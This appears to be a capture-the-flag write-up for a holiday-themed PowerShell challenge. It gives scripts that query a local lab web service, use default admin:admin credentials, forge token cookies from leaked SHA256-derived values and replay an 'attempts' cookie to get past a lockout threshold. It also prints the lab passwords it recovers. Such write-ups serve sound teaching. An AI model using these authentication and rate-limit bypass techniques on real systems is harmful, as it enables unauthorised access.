
# Objective 10: PowerShell

**Difficultree: 🎄🎄🎄**  
**Location: Front Yard (Act 2), East**

The objective is to interact with a web service using PowerShell.

## Silver 🥈
For easy, the player is guided through different activities to familiarize with PowerShell.


1:
```powershell
type welcome.txt
```

2:
```powershell
Get-Content welcome.txt | Measure-Object –Word
```

3:
```powershell
netstat -an
```

4:
```powershell
Invoke-WebRequest -URI http://127.0.0.1:1225
```

5:
```powershell
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))
$basicAuthValue = "Basic $encodedCreds" 
$Headers = @{ Authorization = $basicAuthValue }
Invoke-WebRequest -URI http://127.0.0.1:1225 -Headers $Headers
```

6:
```powershell
foreach ($url in ((Invoke-WebRequest -URI http://127.0.0.1:1225 -Headers $Headers).Links).href){  (Invoke-WebRequest -URI $url -Headers $Headers | Measure-Object –Word).Words  | %{if($_ -match "138"){ Write-Host $url }} }
(Invoke-WebRequest -URI http://localhost:1225/endpoints/13  -Headers $Headers).Content
```

7:
```powershell
(Invoke-WebRequest -URI http://localhost:1225/token_overview.csv  -Headers $Headers).Content
```

8:
```powershell
(Invoke-WebRequest -URI http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C  -Headers $Headers -WebSession $s).Content
```

9:
```powershell
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$c = New-Object System.Net.Cookie('token',"5f8dd236f862f4507835b0e418907ffc",'/','localhost')
$s.Cookies.Add($c)
(Invoke-WebRequest -URI http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C  -Headers $Headers -WebSession $s).Content
```


10:
```powershell
$tok=((Invoke-WebRequest -URI http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C  -Headers $Headers -WebSession $s).Links).href
$c2= New-Object System.Net.Cookie('mfa_token',$tok,'/','localhost')
$s.Cookies.Add($c2)
(Invoke-WebRequest -URI http://localhost:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C  -Headers $Headers -WebSession $s).Content
```

11:
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="))
```

`Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction`


**Achievement: [Silver] PowerShell**

## Gold 🥇
Starting with the `token_overview.csv`, the objective is to bypass the security systems of the application.

```
file_MD5hash,Sha256(file_MD5hash)
04886164e5140175bafe599b7f1cacc8,REDACTED
664f52463ef97bcd1729d6de1028e41e,REDACTED
3e03cd0f3d335c6fb50122553f63ef78,REDACTED
f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
```

The header leaks already, that the right hand side is a SHA256 hash of the left hand side. Some tests with [CyberChef](https://gchq.github.io/CyberChef/#recipe=SHA2%28%27256%27,64,160%29&input=NWY4ZGQyMzZmODYyZjQ1MDc4MzViMGU0MTg5MDdmZmMK) show, that this is in fact the SHA256 hash of the hex string as found on the left with a linefeed appended.

With that, all tokens can be used for validation.

Calling the token validation service returns, that a "fakeout threshold" is set to 10, in addition a cookie "attempts" is set to the [base64](https://gchq.github.io/CyberChef/#recipe=From_Base64%28%27A-Za-z0-9+/=%27,true,false%29&input=YzI1aGEyVnZhV3dLMDE) of `snakeoil`with an increasing integer appended.

Iterating over all tokens while maintaining the cookie provided access to the production and deployment of the snow cannons.

```powershell
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
ForEach ($row in $( Invoke-WebRequest -URI http://localhost:1225/token_overview.csv  -Headers $Headers).Content -split "`r`n"){
  $token=($row -split ",")[0]
  $c = New-Object System.Net.Cookie('token',$token,'/','localhost')
  $s.Cookies.Add($c)
  $string=$token+"`n"                                        
  $hashBytes = $Sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($string))
  $hash = [System.BitConverter]::ToString($hashBytes)                             
  $sha256hash=$hash.toUpper() -replace "-", ""
  $url="http://localhost:1225/tokens/"+$sha256hash                                             
  (Invoke-WebRequest -URI $url -Headers $Headers -WebSession $s).Content
  $tok=((Invoke-WebRequest -URI $url -Headers $Headers -WebSession $s).Links).href
  $c2= New-Object System.Net.Cookie('mfa_token',$tok,'/','localhost')
  $s.Cookies.Add($c2)
  $url="http://localhost:1225/mfa_validate/"+$sha256hash
  $ret=(Invoke-WebRequest -URI $url  -Headers $Headers -WebSession $s)
  $ret.Content |Add-Content -Path l
  $cook=($ret.Headers['Set-Cookie'] -split ";" -split "attempts=")[1]
  $c3= New-Object System.Net.Cookie('attempts',$cook,'/','localhost')
  $s.Cookies.Add($c3)
}
```

`<h1>[+] Success, defense mechanisms deactivated.</h1><br>Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
`

**Achievement: [Gold] PowerShell**
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEyMDUyOTk2NTIsMTEyMTkzNTQ4NF19
-->